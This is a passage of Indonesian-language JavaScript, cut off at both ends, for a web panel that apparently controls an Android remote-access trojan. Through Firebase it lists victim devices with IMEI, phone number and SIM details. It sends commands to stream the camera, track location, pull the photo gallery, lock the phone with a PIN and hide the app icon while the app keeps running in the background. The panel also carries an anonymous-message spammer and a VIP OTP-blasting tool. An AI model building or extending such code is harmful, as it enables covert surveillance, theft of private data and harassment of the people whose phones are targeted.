      <button class="btn btn-danger" id="btn-confirm-delete"><i class="fa-solid fa-trash"></i> Hapus</button>
    </div>`;
  $("#modal").classList.add("show");

  $("#btn-cancel-delete").onclick = () => closeModal();
  $("#btn-confirm-delete").onclick = async () => {
    haptic(20);
    const btn = $("#btn-confirm-delete");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menghapus...';
    try {
      await fbRemove(fbRef(State.db, "targets/" + t.id));
      await fbRemove(fbRef(State.db, "commands/" + t.id));
      await fbRemove(fbRef(State.db, "live/" + t.id));
      await fbRemove(fbRef(State.db, "locations/" + t.id));
      await fbRemove(fbRef(State.db, "gallery/" + t.id));

      toast("Target berhasil dihapus", "ok");
      closeModal();

      await loadTargets();
      goRat();
    } catch (e) {
      console.error("[delete target]", e);
      toast("Gagal hapus: " + e.message, "err");
      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-trash"></i> Hapus';
    }
  };
}

// ============================================================
// FEATURE PAGES
// ============================================================
function renderInfoPage(t) {
  const rows = [
    ["Status", t.status === "online" ? "ONLINE" : "OFFLINE", t.status === "online" ? "var(--success)" : "var(--text-dim)"],
    ["Brand", t.brand || "—"],
    ["Model", t.model || "—"],
    ["IP", t.ip || "—"],
    ["Android", t.android || "—"],
    ["SDK", t.sdk || "—"],
    ["IMEI", t.imei || "—"],
    ["SIM Operator", t.simOperator || "—"],
    ["SIM Country", t.simCountry || "—"],
    ["Phone Number", t.phoneNumber || "—"],
    ["Battery", t.battery ? t.battery + "%" : "—"],
    ["Charging", t.charging ? "Ya" : "Tidak"],
    ["Wifi SSID", t.wifiSSID || "—"],
    ["Carrier", t.carrier || "—"],
    ["Screen", t.screenRes || "—"],
    ["RAM Total", t.ramTotal ? (parseInt(t.ramTotal) / 1073741824).toFixed(2) + " GB" : "—"],
    ["RAM Free", t.ramFree ? (parseInt(t.ramFree) / 1073741824).toFixed(2) + " GB" : "—"],
    ["Storage Total", t.storageTotal ? (parseInt(t.storageTotal) / 1073741824).toFixed(2) + " GB" : "—"],
    ["Storage Free", t.storageFree ? (parseInt(t.storageFree) / 1073741824).toFixed(2) + " GB" : "—"],
    ["Last Seen", timeAgo(t.lastSeen)]
  ];
  $("#info-content").innerHTML = rows.map(([label, val, color]) => `
    <div style="display:flex;justify-content:space-between;font-size:12px;padding:8px 0;border-bottom:1px solid var(--border)">
      <span style="color:var(--text-dim)">${label}</span>
      <span style="font-weight:600;${color ? 'color:' + color : ''};text-align:right;max-width:60%;word-break:break-all">${val}</span>
    </div>
  `).join("");
}

function renderLivePage(t) {
  const canLive = isAndroid11Plus(t);
  const warning = $("#live-warning");
  const toggleRow = $("#live-toggle-row");
  const sw = $("#sw-live");

  if (!canLive) {
    warning.classList.remove("hidden");
    $("#live-android-ver").textContent = t.android || "?";
    sw.disabled = true;
    sw.checked = false;
    toggleRow.style.opacity = ".5";
  } else {
    warning.classList.add("hidden");
    sw.disabled = false;
    toggleRow.style.opacity = "1";
  }
  sw.onchange = (e) => toggleLive(t.id, e.target.checked);
}

async function toggleLive(tid, on) {
  haptic(15);
  if (on) {
    await sendCommand(tid, "live_on", { fps: 2 });
    toast("Live cam aktif", "ok");
    setupLiveScreen(tid);
  } else {
    await sendCommand(tid, "live_off");
    toast("Live cam nonaktif", "info");
    if (State.unsubLive) { State.unsubLive(); State.unsubLive = null; }
    const v = $("#live-view");
    if (v) v.innerHTML = '<div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>';
  }
}

function setupLiveScreen(tid) {
  if (State.unsubLive) State.unsubLive();
  State.unsubLive = fbOnValue(fbRef(State.db, "live/" + tid), (snap) => {
    if (!snap.exists()) return;
    const d = snap.val();
    if (d.frame) {
      const v = $("#live-view");
      if (v) v.innerHTML = `<img src="${d.frame}" alt="live">`;
    }
  });
}

function renderLocatePage(t) {
  const sw = $("#sw-loc");
  sw.onchange = (e) => toggleLocate(t.id, e.target.checked);
}

async function toggleLocate(tid, on) {
  haptic(15);
  if (on) {
    await sendCommand(tid, "locate");
    toast("Meminta lokasi...", "info");
    setupLocate(tid);
  } else {
    await sendCommand(tid, "locate_off");
    if (State.unsubLoc) { State.unsubLoc(); State.unsubLoc = null; }
    const m = $("#loc-map");
    if (m) m.innerHTML = '<div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>';
    const c = $("#loc-coords");
    if (c) c.textContent = "—";
  }
}

function setupLocate(tid) {
  if (State.unsubLoc) State.unsubLoc();
  State.unsubLoc = fbOnValue(fbRef(State.db, "locations/" + tid), (snap) => {
    if (!snap.exists()) return;
    const d = snap.val();
    if (d.lat && d.lng) {
      const m = $("#loc-map");
      if (m) m.innerHTML = `<iframe src="https://maps.google.com/maps?q=${d.lat},${d.lng}&z=16&output=embed"></iframe>`;
      const c = $("#loc-coords");
      if (c) c.textContent = `${d.lat}, ${d.lng}`;
    }
  });
}

function setupFlashToggles(t) {
  const swFlash = $("#sw-flash");
  const swStrobo = $("#sw-strobo");
  swFlash.onchange = async (e) => {
    haptic(15);
    await sendCommand(t.id, e.target.checked ? "flashlight_on" : "flashlight_off");
    toast(e.target.checked ? "Senter nyala" : "Senter mati", "ok");
  };
  swStrobo.onchange = async (e) => {
    haptic(15);
    await sendCommand(t.id, e.target.checked ? "strobo_on" : "strobo_off");
    toast(e.target.checked ? "Strobo nyala" : "Strobo mati", "ok");
  };
}

function setupLockPage(t) {
  const sw = $("#sw-lock");
  const pin = $("#lock-pin");
  sw.onchange = async (e) => {
    haptic(15);
    const code = pin.value.trim();
    if (e.target.checked) {
      if (code.length !== 4) {
        e.target.checked = false;
        return toast("PIN harus 4 digit", "err");
      }
      await sendCommand(t.id, "lock_on", { pin: code });
      toast("HP target dikunci", "ok");
    } else {
      await sendCommand(t.id, "lock_off");
      toast("Lock dibuka", "ok");
    }
  };
}

function setupVolumePage(t) {
  const slider = $("#volume-slider");
  const val = $("#volume-value");
  slider.oninput = () => { val.textContent = slider.value + "%"; };
  $("#btn-set-volume").onclick = async () => {
    haptic(15);
    const v = parseInt(slider.value);
    await sendCommand(t.id, "set_volume", { value: v });
    toast(`Volume di-set ${v}%`, "ok");
  };
}

function setupBrightnessPage(t) {
  const slider = $("#brightness-slider");
  const val = $("#brightness-value");
  slider.oninput = () => { val.textContent = slider.value + "%"; };
  $("#btn-set-brightness").onclick = async () => {
    haptic(15);
    const v = parseInt(slider.value);
    await sendCommand(t.id, "set_brightness", { value: v });
    toast(`Kecerahan di-set ${v}%`, "ok");
  };
}

function setupUrlPage(t) {
  $("#btn-open-url").onclick = async () => {
    haptic(15);
    const url = $("#url-direct").value.trim();
    if (!url) return toast("Isi URL dulu", "err");
    if (!/^https?:\/\//.test(url)) return toast("URL harus diawali http:// atau https://", "err");
    await sendCommand(t.id, "open_url", { url });
    toast("URL dikirim ke target", "ok");
  };
}

function setupGalleryPage(t) {
  $("#btn-get-gallery").onclick = async () => {
    haptic(15);
    toast("Meminta galeri...", "info");
    await sendCommand(t.id, "get_gallery");
    const grid = $("#gallery-grid");
    grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-spinner fa-spin"></i><div>Menunggu galeri dari target...</div></div>';
    if (State.unsubGallery) State.unsubGallery();
    State.unsubGallery = fbOnValue(fbRef(State.db, "gallery/" + t.id), (snap) => {
      if (!snap.exists()) return;
      const data = snap.val();
      const photos = data.photos || [];
      if (photos.length === 0) {
        grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-image"></i><div>Belum ada foto</div></div>';
        return;
      }
      grid.innerHTML = photos.map(url => `
        <div class="g-item" onclick="window.open('${url}','_blank')">
          <img src="${url}" onerror="this.style.background='var(--bg-card)'">
        </div>
      `).join("");
    });
  };
}

function setupToastPage(t) {
  $("#btn-send-toast").onclick = async () => {
    haptic(15);
    const msg = $("#toast-message").value.trim();
    if (!msg) return toast("Isi pesan dulu", "err");
    await sendCommand(t.id, "show_toast", { message: msg });
    toast("Toast terkirim ke target", "ok");
    $("#toast-message").value = "";
  };
}

function setupHideAppPage(t) {
  $("#btn-hide-app").onclick = async () => {
    haptic(15);
    if (!confirm("Sembunyikan icon APK di HP target?\n\nApp tetap jalan di background, tapi icon hilang dari launcher.")) return;
    await sendCommand(t.id, "hide_app");
    toast("Command hide app terkirim", "ok");
  };
  $("#btn-show-app").onclick = async () => {
    haptic(15);
    await sendCommand(t.id, "show_app");
    toast("Command show app terkirim", "ok");
  };
}

// ============================================================
// COMMANDS
// ============================================================
async function sendCommand(tid, type, payload = {}) {
  try {
    const cmdRef = fbPush(fbRef(State.db, "commands/" + tid));
    await fbSet(cmdRef, {
      type, payload,
      fromUid: State.uid,
      status: "pending",
      createdAt: Date.now()
    });
    return true;
  } catch (e) {
    toast("Gagal kirim command", "err");
    return false;
  }
}

// ============================================================
// BLUXANIME
// ============================================================
async function goAnime() {
  showScreen("anime");
  State.animeSearchMode = false;
  $("#anime-search-inline").classList.remove("show");
  loadAnimeBanner();
  loadAnimeRows();
}

async function loadAnimeBanner() {
  const img = $("#anime-banner-img");
  if (img) img.src = CONFIG.ANIME_BANNER + "?t=" + Date.now();
}

async function loadAnimeRows() {
  const rows = $("#anime-rows");
  rows.innerHTML = '<div class="anime-loading"><div class="sp"></div><span>Loading anime...</span></div>';
  try {
    const [recent, recent2, completed] = await Promise.all([
      fetch(`${CONFIG.ANIME_API}?recent=1&page=1`).then(r => r.json()).catch(() => null),
      fetch(`${CONFIG.ANIME_API}?recent=1&page=2`).then(r => r.json()).catch(() => null),
      fetch(`${CONFIG.ANIME_API}?completed=1&page=1`).then(r => r.json()).catch(() => null)
    ]);
    const trending = dedupe(recent?.data?.animeList || []);
    const newRel = dedupe(recent2?.data?.animeList || []);
    const comp = dedupe(completed?.data?.animeList || []);
    let html = "";
    const cont = getContinueWatching();
    if (cont.length > 0) html += renderAnimeRow("📺 Lanjutkan Nonton", cont);
    if (trending.length) html += renderAnimeRow("🔥 Trending Today", trending);
    if (newRel.length) html += renderAnimeRow("✨ New Release", newRel);
    if (comp.length) html += renderAnimeRow("✅ Completed", comp);
    if (!html) html = '<div class="anime-empty"><i class="fa-solid fa-tv"></i>Gagal load anime</div>';
    rows.innerHTML = html;
    bindAnimeCards();
  } catch (e) {
    rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-triangle-exclamation"></i>Gagal load anime</div>';
  }
}

function dedupe(arr) {
  const seen = new Set();
  const out = [];
  for (const a of arr) {
    if (!a || !a.link) continue;
    if (seen.has(a.link)) continue;
    seen.add(a.link);
    out.push(a);
  }
  return out;
}

function renderAnimeRow(title, items) {
  return `<div class="anime-row">
    <div class="anime-row-head"><div class="t">${title}</div></div>
    <div class="anime-row-scroll">${items.map(a => renderAnimeCard(a)).join("")}</div>
  </div>`;
}

function renderAnimeCard(a) {
  const title = cleanTitle(a.title);
  const type = a.type || "TV";
  const ep = a.latestEpisode || a.totalEpisode || "";
  return `<div class="anime-card" data-link="${a.link}" data-title="${title}" data-image="${a.image}" data-type="${type}">
    <div class="cover">
      <img src="${a.image}" onerror="this.style.background='var(--bg-card)'">
      <span class="type-badge">${type}</span>
      ${ep ? `<span class="ep-badge">${ep}</span>` : ""}
    </div>
    <div class="title">${title}</div>
  </div>`;
}

function bindAnimeCards() {
  $$(".anime-card").forEach(el => {
    el.onclick = () => {
      haptic(10);
      openAnimeDetail(el.dataset.link, el.dataset.title, el.dataset.image, el.dataset.type);
    };
  });
}

async function searchAnime(q) {
  if (!q.trim()) return;
  const rows = $("#anime-rows");
  rows.innerHTML = '<div class="anime-loading"><div class="sp"></div><span>Mencari...</span></div>';
  State.animeSearchMode = true;
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?search=${encodeURIComponent(q)}`);
    const data = await res.json();
    const list = dedupe(data?.data?.results || []);
    if (list.length === 0) {
      rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-magnifying-glass"></i>Anime tidak ditemukan</div>';
      return;
    }
    rows.innerHTML = `<div class="anime-search-grid">${list.map(a => renderAnimeCard(a)).join("")}</div>`;
    bindAnimeCards();
  } catch (e) {
    rows.innerHTML = '<div class="anime-empty"><i class="fa-solid fa-triangle-exclamation"></i>Gagal mencari</div>';
  }
}

async function openAnimeDetail(link, title, image, type) {
  const box = $("#modal-box");
  box.innerHTML = `<div class="anime-loading"><div class="sp"></div><span>Loading detail...</span></div>`;
  $("#modal").classList.add("show");
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?details=${encodeURIComponent(link)}`);
    const data = await res.json();
    const d = data?.data;
    if (!d) throw new Error("No data");
    State.animeCurrentDetail = d;
    const genres = (d.genres || []).map(g => `<span class="g">${g}</span>`).join("");
    const info = d.info || {};
    const episodes = (d.episodes || []).map(e => {
      const epNum = e.episode.replace(/[^0-9]/g, "") || "?";
      return `<div class="ad-ep" data-epurl="${e.episodeUrl}" data-eptitle="${e.title}">
        <div class="ep-num">${epNum}</div>
        <div class="ep-info"><div class="t">${e.title}</div><div class="d">${e.date || ""}</div></div>
        <div class="ep-play"><i class="fa-solid fa-play"></i></div>
      </div>`;
    }).join("");
    box.innerHTML = `
      <div class="anime-detail">
        <div class="ad-hero"><img src="${d.image}" onerror="this.style.display='none'"></div>
        <div class="ad-title">${d.title}</div>
        <div class="ad-genres">${genres}</div>
        <div class="ad-info">
          <div class="i"><div class="l">Status</div><div class="v">${info.Status || "—"}</div></div>
          <div class="i"><div class="l">Studio</div><div class="v">${info.Studio || "—"}</div></div>
          <div class="i"><div class="l">Dirilis</div><div class="v">${info.Dirilis || "—"}</div></div>
          <div class="i"><div class="l">Tipe</div><div class="v">${info.Tipe || "—"}</div></div>
          <div class="i"><div class="l">Episode</div><div class="v">${info.Episode || "—"}</div></div>
          <div class="i"><div class="l">Durasi</div><div class="v">${info.Durasi || "—"}</div></div>
        </div>
        ${d.sinopsis ? `<div class="ad-synopsis">${d.sinopsis}</div>` : ""}
        <div class="ad-eps-label">Daftar Episode</div>
        <div class="ad-eps">${episodes || '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Belum ada episode</div>'}</div>
        <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>
      </div>`;
    $$(".ad-ep").forEach(el => {
      el.onclick = () => {
        haptic(8);
        playAnimeEpisode(el.dataset.epurl, el.dataset.eptitle, d);
      };
    });
  } catch (e) {
    box.innerHTML = `<h3>Gagal</h3><div class="sub">Tidak bisa memuat detail anime</div><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  }
}

async function playAnimeEpisode(epUrl, epTitle, detail) {
  const box = $("#modal-box");
  box.innerHTML = `<div class="anime-loading"><div class="sp"></div><span>Loading stream...</span></div>`;
  try {
    const res = await fetch(`${CONFIG.ANIME_API}?stream=${encodeURIComponent(epUrl)}`);
    const data = await res.json();
    const streamUrl = data?.data?.streamUrl;
    if (!streamUrl) throw new Error("No stream");
    box.innerHTML = `
      <div class="anime-stream">
        <div class="as-header">
          <div class="as-back" id="as-back"><i class="fa-solid fa-arrow-left"></i></div>
          <div class="as-title">${epTitle || "Episode"}</div>
        </div>
        <div class="player-wrap"><iframe src="${streamUrl}" allowfullscreen></iframe></div>
        <div style="font-size:11px;color:var(--text-dim);margin-top:12px;text-align:center">Jika video tidak muncul, coba refresh</div>
        <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>
      </div>`;
    $("#as-back").onclick = () => {
      haptic(8);
      if (State.animeCurrentDetail) {
        openAnimeDetail(State.animeCurrentDetail.url, State.animeCurrentDetail.title, State.animeCurrentDetail.image, "");
      }
    };
    if (detail) saveContinueWatching(detail, epTitle, epUrl);
  } catch (e) {
    showPlayerError(box, epUrl, epTitle);
  }
}

function showPlayerError(box, epUrl, epTitle) {
  box.innerHTML = `
    <div class="anime-stream">
      <div class="as-header">
        <div class="as-back" id="as-back"><i class="fa-solid fa-arrow-left"></i></div>
        <div class="as-title">${epTitle || "Episode"}</div>
      </div>
      <div class="player-wrap">
        <div class="player-error">
          <i class="fa-solid fa-circle-exclamation"></i>
          <div class="t">Gagal load video, coba lagi</div>
          <button class="btn btn-primary" id="btn-retry" style="max-width:200px"><i class="fa-solid fa-rotate"></i> Coba Lagi</button>
        </div>
      </div>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>
    </div>`;
  $("#as-back").onclick = () => {
    haptic(8);
    if (State.animeCurrentDetail) {
      openAnimeDetail(State.animeCurrentDetail.url, State.animeCurrentDetail.title, State.animeCurrentDetail.image, "");
    }
  };
  $("#btn-retry").onclick = () => {
    haptic(10);
    playAnimeEpisode(epUrl, epTitle, State.animeCurrentDetail);
  };
}

function getContinueWatching() {
  try { return JSON.parse(localStorage.getItem("bluxus_continue") || "[]"); }
  catch (e) { return []; }
}

function saveContinueWatching(detail, epTitle, epUrl) {
  try {
    let list = getContinueWatching();
    list = list.filter(x => x.link !== detail.url);
    list.unshift({
      title: cleanTitle(detail.title),
      link: detail.url,
      image: detail.image,
      type: "TV",
      latestEpisode: epTitle || "",
      episodeUrl: epUrl,
      at: Date.now()
    });
    list = list.slice(0, 10);
    localStorage.setItem("bluxus_continue", JSON.stringify(list));
  } catch (e) {}
}

function initAnimeEvents() {
  $("#btn-anime-search").onclick = () => {
    haptic(8);
    $("#anime-search-inline").classList.add("show");
    $("#anime-search-input").focus();
  };
  $("#btn-anime-search-close").onclick = () => {
    haptic(8);
    $("#anime-search-inline").classList.remove("show");
    $("#anime-search-input").value = "";
    if (State.animeSearchMode) {
      State.animeSearchMode = false;
      loadAnimeRows();
    }
  };
  $("#anime-search-input").addEventListener("keydown", e => {
    if (e.key === "Enter") searchAnime(e.target.value);
  });
}

// ============================================================
// TOOLS
// ============================================================
const TOOLS = [
  { id: "tolink", name: "To Link", desc: "Upload foto/video → URL", icon: "fa-link" },
  { id: "spotify", name: "Spotify Preview", desc: "Cari & preview lagu", icon: "fa-music" },
  { id: "gempa", name: "Info Gempa", desc: "Data gempa dari BMKG", icon: "fa-mountain-sun" },
  { id: "ngl", name: "NGL Spamer", desc: "Spam pertanyaan NGL", icon: "fa-comment-dots" },
  { id: "qr", name: "URL to QR", desc: "Ubah URL jadi QR code", icon: "fa-qrcode" }
];

const VIP_TOOLS = [
  { id: "otp", name: "Spam OTP", desc: "Blast OTP ke nomor", icon: "fa-bolt" }
];

async function checkMaintenance() {
  try {
    const snap = await fbGet(fbRef(State.db, "maintenance"));
    return snap.exists() ? snap.val() : {};
  } catch (e) { return {}; }
}

async function goTools() {
  showScreen("tools");
  const g = $("#tools-grid");
  const vg = $("#vip-tools-grid");
  const maint = await checkMaintenance();
  const vip = isVIP();

  g.innerHTML = TOOLS.map(t => {
    const isMaint = maint[t.id]?.active;
    return `
      <div class="tool-card ${isMaint ? "maintenance" : ""}" data-tool="${t.id}" data-maint="${isMaint}">
        <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
        <div class="tc-name">${t.name}</div>
        <div class="tc-desc">${isMaint ? (maint[t.id].message || "Sedang maintenance") : t.desc}</div>
      </div>`;
  }).join("");

  vg.innerHTML = VIP_TOOLS.map(t => {
    const isMaint = maint[t.id]?.active;
    return `
      <div class="tool-card vip ${vip ? "" : "locked"} ${isMaint ? "maintenance" : ""}" data-tool="${t.id}" data-maint="${isMaint}">
        <div class="tc-badge vip-badge">VIP</div>
        <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
        <div class="tc-name">${t.name}</div>
        <div class="tc-desc">${isMaint ? (maint[t.id].message || "Sedang maintenance") : t.desc}</div>
      </div>`;
  }).join("");

  $$(".tool-card").forEach(el => el.onclick = () => {
    haptic(10);
    if (el.dataset.maint === "true") {
      return toast("Fitur ini sedang maintenance", "warn");
    }
    openTool(el.dataset.tool, el.classList.contains("locked"));
  });
}

function openTool(id, locked) {
  if (locked) return toast("Butuh akses VIP", "warn");
  if (id === "tolink") return toolToLink();
  if (id === "spotify") return toolSpotify();
  if (id === "gempa") return toolGempa();
  if (id === "ngl") return toolNGL();
  if (id === "qr") return toolQR();
  if (id === "otp") return toolOTP();
}

function toolToLink() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>To Link</h3><div class="sub">Upload foto/video, dapet URL-nya</div>
    <div class="upload-zone" id="upload-zone">
      <input type="file" id="upload-input" accept="image/*,video/*">
      <div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
      <div class="uz-title">Tap untuk pilih file</div>
      <div class="uz-desc">Max 2 MB</div>
    </div>
    <div class="upload-progress" id="upload-progress">
      <div class="up-bar"><div class="up-fill" id="up-fill"></div></div>
      <div class="up-text" id="up-text">Mengunggah... 0%</div>
    </div>
    <div class="upload-result" id="upload-result">
      <div class="ur-head"><div class="ico-badge"><i class="fa-solid fa-circle-check"></i></div><div class="t">Upload Berhasil</div></div>
      <div class="ur-row"><span class="l">URL</span><span class="v" id="ur-url">—</span></div>
      <div class="ur-row"><span class="l">Size</span><span class="v" id="ur-size">—</span></div>
      <div class="ur-row"><span class="l">Created</span><span class="v" id="ur-created">—</span></div>
      <div class="ur-row"><span class="l">API by</span><span class="v">Termai</span></div>
      <div class="ur-actions">
        <button class="btn btn-ghost" id="btn-copy-url"><i class="fa-solid fa-copy"></i> Copy</button>
        <button class="btn btn-primary" id="btn-open-url"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka</button>
      </div>
    </div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#upload-input").onchange = () => {
    const f = $("#upload-input").files[0];
    if (f) handleUpload(f);
  };
}

async function handleUpload(file) {
  if (file.size > CONFIG.MAX_UPLOAD) return toast("File max 2 MB", "err");
  const ext = file.name.split(".").pop().toLowerCase();
  if (!["jpg", "jpeg", "png", "gif", "webp", "mp4", "webm"].includes(ext)) return toast("Format tidak didukung", "err");
  $("#upload-progress").classList.add("show");
  $("#upload-result").classList.remove("show");
  $("#up-fill").style.width = "0%";
  const fd = new FormData();
  fd.append("file", file, file.name);
  const xhr = new XMLHttpRequest();
  xhr.open("POST", `${CONFIG.TERMAI_URL}/api/upload?key=${CONFIG.TERMAI_KEY}`);
  xhr.upload.onprogress = (e) => {
    if (e.lengthComputable) {
      const p = Math.round(e.loaded / e.total * 100);
      $("#up-fill").style.width = p + "%";
      $("#up-text").textContent = `Mengunggah... ${p}%`;
    }
  };
  xhr.onload = () => {
    try {
      const r = JSON.parse(xhr.responseText);
      if (r.status && r.path) {
        $("#up-fill").style.width = "100%";
        $("#up-text").textContent = "Selesai!";
        setTimeout(() => {
          $("#upload-progress").classList.remove("show");
          $("#ur-url").textContent = r.path;
          $("#ur-size").textContent = fmtSize(r.size);
          $("#ur-created").textContent = fmtDateTime(Date.now());
          $("#upload-result").classList.add("show");
          $("#btn-copy-url").onclick = async () => {
            haptic(10);
            const ok = await copyToClipboard(r.path);
            toast(ok ? "URL di-copy" : "Gagal copy", ok ? "ok" : "err");
          };
          $("#btn-open-url").onclick = () => {
            haptic(10);
            window.open(r.path, "_blank");
          };
        }, 400);
      } else {
        toast("Upload gagal", "err");
        $("#upload-progress").classList.remove("show");
      }
    } catch (e) {
      toast("Upload gagal", "err");
      $("#upload-progress").classList.remove("show");
    }
  };
  xhr.onerror = () => {
    toast("Koneksi error", "err");
    $("#upload-progress").classList.remove("show");
  };
  xhr.send(fd);
}

function toolSpotify() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Spotify Preview</h3><div class="sub">Cari lagu & preview 30 detik</div>
    <div class="field">
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-search"></i></div>
        <input type="text" id="sp-q" placeholder="Cari lagu...">
      </div>
    </div>
    <button class="btn btn-primary" id="sp-search"><i class="fa-solid fa-search"></i> Cari</button>
    <div id="sp-results" class="spotify-list"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#sp-search").onclick = doSpotifySearch;
  $("#sp-q").addEventListener("keydown", e => { if (e.key === "Enter") doSpotifySearch(); });
}

async function doSpotifySearch() {
  const q = $("#sp-q").value.trim();
  if (!q) return toast("Isi query", "err");
  const btn = $("#sp-search");
  btn.disabled = true;
  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/spotify?q=${encodeURIComponent(q)}&api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status !== "success" || !data.result) {
      $("#sp-results").innerHTML = '<div style="text-align:center;color:var(--text-mute);padding:20px;font-size:12px">Lagu tidak ditemukan</div>';
      return;
    }
    $("#sp-results").innerHTML = data.result.map((t, i) => `
      <div class="spotify-item" data-idx="${i}">
        <img class="sp-cover" src="${t.thumb}" onerror="this.style.background='var(--bg-card)'">
        <div class="sp-info">
          <div class="t">${t.title}</div>
          <div class="a">${t.artist}</div>
          <div class="d">${t.duration}</div>
        </div>
        <div class="sp-play"><i class="fa-solid fa-play"></i></div>
      </div>`).join("");
    $$(".spotify-item").forEach(el => {
      el.onclick = () => {
        haptic(10);
        const t = data.result[parseInt(el.dataset.idx)];
        playTrack(t);
      };
    });
  } catch (e) {
    toast("Gagal cari lagu", "err");
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fa-solid fa-search"></i> Cari';
  }
}

function playTrack(t) {
  if (!t.preview) return toast("Preview tidak tersedia", "warn");
  if (State.audio) { State.audio.pause(); State.audio = null; }
  State.currentTrack = t;
  const audio = new Audio(t.preview);
  State.audio = audio;
  $("#pb-cover").src = t.thumb;
  $("#pb-title").textContent = t.title;
  $("#pb-artist").textContent = t.artist;
  $("#player-bar").classList.add("show");
  audio.play();
  $("#pb-toggle-icon").className = "fa-solid fa-pause";
  audio.ontimeupdate = () => {
    const p = (audio.currentTime / audio.duration) * 100;
    $("#pb-progress").style.width = p + "%";
  };
  audio.onended = () => { $("#pb-toggle-icon").className = "fa-solid fa-play"; };
  audio.onerror = () => { toast("Gagal memutar preview", "err"); };
}

function initPlayer() {
  $("#pb-toggle").onclick = () => {
    haptic(10);
    if (!State.audio) return;
    if (State.audio.paused) {
      State.audio.play();
      $("#pb-toggle-icon").className = "fa-solid fa-pause";
    } else {
      State.audio.pause();
      $("#pb-toggle-icon").className = "fa-solid fa-play";
    }
  };
  $("#pb-close").onclick = () => {
    haptic(10);
    if (State.audio) { State.audio.pause(); State.audio = null; }
    $("#player-bar").classList.remove("show");
  };
}

function toolGempa() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Info Gempa</h3><div class="sub">Data gempa terkini dari BMKG</div>
    <div id="gempa-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
    <button class="btn btn-ghost" id="gempa-refresh" style="margin-top:14px"><i class="fa-solid fa-rotate"></i> Refresh</button>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  loadGempa();
  $("#gempa-refresh").onclick = () => { haptic(10); loadGempa(); };
}

async function loadGempa() {
  const box = $("#gempa-content");
  if (!box) return;
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/gempa?api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status !== "success" || !data.result) {
      box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center">Gagal load</div>';
      return;
    }
    const r = data.result;
    const mag = parseFloat(r.magnitude) || 0;
    let cls = "";
    if (mag >= 6) cls = "critical";
    else if (mag >= 5) cls = "danger";
    else if (mag >= 3) cls = "warn";
    box.innerHTML = `
      <div class="gempa-card">
        <div class="gempa-mag ${cls}">
          <div class="m-value">${r.magnitude}</div>
          <div class="m-label">Magnitudo</div>
        </div>
        <div class="gempa-detail">
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-location-dot"></i></div><div class="info"><div class="l">Wilayah</div><div class="v">${r.wilayah || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-clock"></i></div><div class="info"><div class="l">Waktu</div><div class="v">${r.tanggal || "—"}, ${r.jam || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-arrow-down"></i></div><div class="info"><div class="l">Kedalaman</div><div class="v">${r.kedalaman || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-compass"></i></div><div class="info"><div class="l">Koordinat</div><div class="v">${r.lintang || ""} ${r.bujur || ""}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div class="info"><div class="l">Potensi</div><div class="v">${r.potensi || "—"}</div></div></div>
          <div class="gempa-row"><div class="icon"><i class="fa-solid fa-bolt"></i></div><div class="info"><div class="l">Dirasakan</div><div class="v">${r.dirasakan || "—"}</div></div></div>
        </div>
        ${r.shakemap_url ? `<div class="gempa-shakemap"><div class="lbl">Shakemap</div><img src="${r.shakemap_url}" onclick="window.open('${r.shakemap_url}','_blank')" onerror="this.style.display='none'"></div>` : ""}
      </div>`;
  } catch (e) {
    box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center">Gagal load</div>';
  }
}

function toolNGL() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>NGL Spamer</h3><div class="sub">Kirim pertanyaan anonim ke NGL</div>
    <div class="field">
      <label>Username NGL</label>
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-at"></i></div>
        <input type="text" id="ngl-user" placeholder="username">
      </div>
    </div>
    <div class="field">
      <label>Pertanyaan</label>
      <div class="input-wrap">
